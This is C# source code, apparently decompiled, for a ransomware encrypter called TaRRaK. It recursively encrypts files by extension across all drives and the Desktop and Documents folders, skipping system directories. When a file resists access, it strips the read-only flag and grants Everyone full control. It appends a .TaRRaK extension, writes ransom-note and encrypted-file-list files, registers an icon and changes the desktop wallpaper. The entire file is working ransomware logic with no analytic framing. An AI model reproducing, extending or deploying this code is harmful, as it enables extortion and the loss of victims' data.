using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;
using TaRRaK.Properties;

namespace TaRRaK;

public class TaRRaKEncrypter
{
	private readonly string _noteFileName = "Note fom TaRRaK.txt";

	private readonly string _encryptedFileName = "Encrypted Files by TaRRaK.txt";

	private readonly string _icoFileName = "TaRRaK.ico";

	private readonly string _wallpaperFileName = "TaRRaK.bmp";

	private readonly string _extension;

	private readonly string[] _extensions;

	private readonly Encrypter _encrypter;

	private readonly List<string> _encrypted = new List<string>();

	public TaRRaKEncrypter()
	{
		_extension = ".TaRRaK";
		_extensions = Resources.extensions.Split(new string[2] { "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
		_encrypter = new Encrypter();
	}

	public void Start()
	{
		foreach (string startingPath in GetStartingPaths())
		{
			EncryptAll(startingPath);
		}
		SetNote();
		SetFileIcon();
		SetWallPaper();
	}

	private IEnumerable<string> GetStartingPaths()
	{
		List<string> list = new List<string>();
		list.AddRange(GetSpecialFolders());
		list.AddRange(from drive in DriveInfo.GetDrives()
			select drive.Name);
		return list;
	}

	private IEnumerable<string> GetSpecialFolders()
	{
		return new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal)
		};
	}

	private void EncryptAll(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			foreach (string path2 in files)
			{
				string ext = Path.GetExtension(path2);
				if (_extensions.Any((string x) => string.Equals(x, ext, StringComparison.OrdinalIgnoreCase)))
				{
					EncryptFile(path2);
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files = Directory.GetDirectories(path);
			foreach (string text in files)
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains(":\\Windows") && !text.Contains("\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("\\Local\\Microsoft\\") && !text.Contains(":\\ProgramData\\"))
				{
					EncryptAll(text);
				}
			}
		}
		catch
		{
		}
	}

	private void EncryptFile(string path)
	{
		if (!File.Exists(path))
		{
			return;
		}
		string fileName = Path.GetFileName(path);
		if (fileName == _noteFileName || fileName == _encryptedFileName || fileName == _icoFileName || fileName == _icoFileName)
		{
			return;
		}
		byte[] array = new byte[0];
		int num = 0;
		while (num < 1)
		{
			try
			{
				array = File.ReadAllBytes(path);
				array = _encrypter.Encrypt(array);
				num++;
				_encrypted.Add(path);
			}
			catch
			{
				try
				{
					FileAttributes attributes = File.GetAttributes(path);
					if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
					{
						attributes &= ~FileAttributes.ReadOnly;
						File.SetAttributes(path, attributes);
					}
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					DirectorySecurity accessControl = directoryInfo.GetAccessControl();
					accessControl.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
					directoryInfo.SetAccessControl(accessControl);
				}
				catch
				{
				}
			}
		}
		try
		{
			File.WriteAllBytes(path, array);
			File.Move(path, path + _extension);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	private void SetWallPaper()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _wallpaperFileName);
			((Image)Resources.wallpaper).Save(text, ImageFormat.get_Bmp());
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey!.SetValue("WallpaperStyle", "1");
			registryKey!.SetValue("TileWallpaper", "0");
			SystemParametersInfo(20, 0, text, 3);
		}
		catch
		{
		}
	}

	private void SetFileIcon()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _icoFileName);
			using MemoryStream memoryStream = new MemoryStream();
			Resources.tarrak.Save((Stream)memoryStream);
			File.WriteAllBytes(text, memoryStream.ToArray());
			Registry.ClassesRoot.CreateSubKey(_extension + "\\DefaultIcon", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue(string.Empty, text);
		}
		catch
		{
		}
	}

	private void SetNote()
	{
		if (_encrypted.Count == 0)
		{
			return;
		}
		try
		{
			string text = Resources.Note_fom_TaRRaK.Replace("#FILECOUNT#", _encrypted.Count.ToString()).Replace("#SYSTEMID#", Convert.ToBase64String(Encrypter.SystemId));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(text);
			stringBuilder.AppendLine();
			stringBuilder.AppendLine("Encrypted file list:");
			foreach (string item in _encrypted)
			{
				stringBuilder.AppendLine(item);
			}
			string contents = stringBuilder.ToString();
			foreach (string startingPath in GetStartingPaths())
			{
				try
				{
					File.WriteAllText(Path.Combine(startingPath, _noteFileName), text);
					File.WriteAllText(Path.Combine(startingPath, _encryptedFileName), contents);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
